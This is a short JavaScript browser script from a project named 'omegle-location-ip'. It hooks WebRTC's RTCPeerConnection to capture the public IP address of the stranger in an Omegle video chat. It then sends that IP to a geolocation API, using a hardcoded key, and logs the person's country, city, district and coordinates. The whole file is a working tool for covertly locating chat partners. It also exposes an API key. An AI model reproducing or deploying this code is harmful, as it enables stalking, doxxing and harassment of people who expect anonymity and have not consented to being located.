/// L14 <l14ms1@protonmail.com>
/// https://github.com/L14ms111/omegle-location-ip
/// Created the 16/02/2021

// the API key allowing to know the location of someone thanks to an IP : https://ipgeolocation.io
let keyapi = "8d3373cc74884e1d8cf43a792b1da3b5";

window.oRTCPeerConnection =
    window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");

        console.log(iceCandidate.candidate);
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};
// Use the API to be able to locate the person thanks to an IP :)
let getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${keyapi}&ip=${ip}`;

    await fetch(url).then((response) =>
        response.json().then((json) => {
            const output = `
-------------------------------
IP: ${ip}
Country: ${json.country_name}
State: ${json.state_prov}
City: ${json.city}
District: ${json.district}
Lat / Long: (${json.latitude}, ${json.longitude})
-------------------------------
by L14 :)
          `;
            console.log(output);
        })
    );
};
